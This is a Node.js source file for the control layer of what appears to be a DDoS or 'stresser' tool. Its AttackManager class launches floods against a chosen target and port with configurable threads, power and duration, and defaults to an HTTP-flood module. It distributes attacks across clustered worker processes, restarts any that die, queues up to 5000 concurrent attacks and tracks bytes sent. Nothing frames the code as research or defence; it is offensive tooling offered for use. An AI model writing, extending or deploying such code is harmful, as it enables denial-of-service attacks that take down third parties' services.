const EventEmitter = require('events');
const os = require('os');
const cluster = require('cluster');
const Logger = require('./utils/logger');

class AttackManager extends EventEmitter {
  constructor(maxConcurrent = 5000) {
    super();
    this.maxConcurrent = maxConcurrent;
    this.activeAttacks = new Map();
    this.attackQueue = [];
    this.workerPool = [];
    this.stats = {
      totalAttacks: 0,
      successful: 0,
      failed: 0,
      bytesSent: 0,
      startTime: Date.now()
    };
    this.logger = new Logger();
    
    // Initialize worker pool for multi-core processing
    this.initWorkerPool();
  }
  
  initWorkerPool() {
    const cpuCount = os.cpus().length;
    
    if (cluster.isMaster) {
      // Create worker processes
      for (let i = 0; i < cpuCount; i++) {
        const worker = cluster.fork();
        this.workerPool.push(worker);
        
        worker.on('message', (msg) => {
          this.handleWorkerMessage(worker, msg);
        });
      }
      
      cluster.on('exit', (worker) => {
        this.logger.warn(`Worker ${worker.process.pid} died. Restarting...`);
        const newWorker = cluster.fork();
        this.workerPool.push(newWorker);
      });
    }
  }
  
  async launchAttack(attackConfig) {
    const {
      type,
      target,
      port = 80,
      duration = 60,
      threads = 200,
      power = 100,
      method = 'http'
    } = attackConfig;
    
    const attackId = this.generateAttackId();
    
    // Check capacity
    if (this.activeAttacks.size >= this.maxConcurrent) {
      const queuePosition = this.attackQueue.length + 1;
      this.attackQueue.push({ ...attackConfig, attackId });
      return {
        status: 'queued',
        attackId,
        queuePosition,
        message: `Attack queued at position ${queuePosition}`
      };
    }
    
    // Load attack module
    let attackModule;
    try {
      attackModule = require(`./attacks/${type}-attack`);
    } catch (error) {
      attackModule = require('./attacks/http-flood');
    }
    
    // Create attack instance
    const attack = new attackModule({
      target,
      port,
      duration,
      threads,
      power,
      id: attackId
    });
    
    // Store attack
    this.activeAttacks.set(attackId, {
      id: attackId,
      type,
      target: `${target}:${port}`,
      startTime: Date.now(),
      status: 'running',
      instance: attack,
      stats: {
        packetsSent: 0,
        bytesSent: 0,
        threadsActive: 0
      }
    });
    
    this.stats.totalAttacks++;
    
    // Distribute to worker
    if (this.workerPool.length > 0) {
      const worker = this.getAvailableWorker();
      if (worker) {
        worker.send({
          type: 'START_ATTACK',
          attackId,
          config: attackConfig
        });
      }
    } else {
      // Run in main thread if no workers
      attack.start().catch(error => {
        this.logger.error(`Attack ${attackId} failed: ${error.message}`);
      });
    }
    
    // Set timeout to auto-stop
    setTimeout(() => {
      this.stopAttack(attackId);
    }, duration * 1000);
    
    return {
      status: 'launched',
      attackId,
      target: `${target}:${port}`,
      duration,
      threads,
      power
    };
  }
  
  stopAttack(attackId) {
    const attack = this.activeAttacks.get(attackId);
    if (!attack) {
      return { status: 'not_found', attackId };
    }
    
    if (attack.instance && typeof attack.instance.stop === 'function') {
      attack.instance.stop();
    }
    
    // Notify workers
    this.workerPool.forEach(worker => {
      worker.send({
        type: 'STOP_ATTACK',
        attackId
      });
    });
    
    attack.status = 'stopped';
    attack.endTime = Date.now();
    
    this.activeAttacks.delete(attackId);
    
    // Process queue
    this.processQueue();
    
    return {
      status: 'stopped',
      attackId,
      duration: (attack.endTime - attack.startTime) / 1000
    };
  }
  
  stopAllAttacks() {
    const stopped = [];
    for (const [attackId, attack] of this.activeAttacks) {
      if (attack.instance && typeof attack.instance.stop === 'function') {
        attack.instance.stop();
      }
      attack.status = 'stopped';
      attack.endTime = Date.now();
      stopped.push(attackId);
    }
    
    this.activeAttacks.clear();
    
    // Clear queue
    this.attackQueue = [];
    
    return {
      status: 'all_stopped',
      stopped: stopped.length,
      attackIds: stopped
    };
  }
  
  processQueue() {
    while (this.attackQueue.length > 0 && this.activeAttacks.size < this.maxConcurrent) {
      const queuedAttack = this.attackQueue.shift();
      this.launchAttack(queuedAttack);
    }
  }
  
  getAvailableWorker() {
    // Simple round-robin worker selection
    const worker = this.workerPool.shift();
    if (worker) {
      this.workerPool.push(worker);
    }
    return worker;
  }
  
  handleWorkerMessage(worker, message) {
    switch (message.type) {
      case 'ATTACK_UPDATE':
        this.updateAttackStats(message.attackId, message.stats);
        break;
      case 'ATTACK_COMPLETE':
        this.completeAttack(message.attackId, message.result);
        break;
      case 'WORKER_READY':
        this.logger.info(`Worker ${worker.process.pid} ready`);
        break;
    }
  }
  
  updateAttackStats(attackId, stats) {
    const attack = this.activeAttacks.get(attackId);
    if (attack) {
      attack.stats = { ...attack.stats, ...stats };
      this.stats.bytesSent += stats.bytesSent || 0;
    }
  }
  
  completeAttack(attackId, result) {
    const attack = this.activeAttacks.get(attackId);
    if (attack) {
      attack.status = 'completed';
      attack.endTime = Date.now();
      attack.result = result;
      
      if (result.success) {
        this.stats.successful++;
      } else {
        this.stats.failed++;
      }
      
      this.activeAttacks.delete(attackId);
      this.processQueue();
    }
  }
  
  generateAttackId() {
    return `ATTACK_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
  }
  
  getActiveCount() {
    return this.activeAttacks.size;
  }
  
  getQueueCount() {
    return this.attackQueue.length;
  }
  
  getStats() {
    const now = Date.now();
    const uptime = (now - this.stats.startTime) / 1000;
    
    return {
      ...this.stats,
      uptime: Math.floor(uptime),
      activeAttacks: this.activeAttacks.size,
      queuedAttacks: this.attackQueue.length,
      availableCapacity: this.maxConcurrent - this.activeAttacks.size,
      systemLoad: os.loadavg(),
      freeMemory: os.freemem(),
      totalMemory: os.totalmem()
    };
  }
  
  getAttackDetails(attackId) {
    const attack = this.activeAttacks.get(attackId);
    if (!attack && this.attackQueue.some(a => a.attackId === attackId)) {
      const queued = this.attackQueue.find(a => a.attackId === attackId);
      return {
        status: 'queued',
        position: this.attackQueue.findIndex(a => a.attackId === attackId) + 1,
        ...queued
      };
    }
    return attack;
  }
}

module.exports = AttackManager;
